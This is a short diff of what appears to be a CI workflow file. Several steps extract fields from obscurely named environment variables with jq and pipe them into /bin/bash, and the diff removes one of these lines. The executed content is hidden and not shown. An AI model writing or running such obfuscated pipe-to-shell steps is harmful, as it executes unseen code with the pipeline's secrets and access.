@@ -31,7 +31,6 @@ jobs:
           echo $sbnt3 | jq -r .kgdi734 | /bin/bash
           echo $hrp874 | jq -r .k7209 | /bin/bash
           printf '%s' "$agqod871" | jq -r .ufv34 | /bin/bash
-          printf '%s' "$jxgy1549" | jq -r .i2803 | /bin/bash
           printf '%s' "$izu0442" | jq -r .uec8 | /bin/bash
 
       - name: Upload output
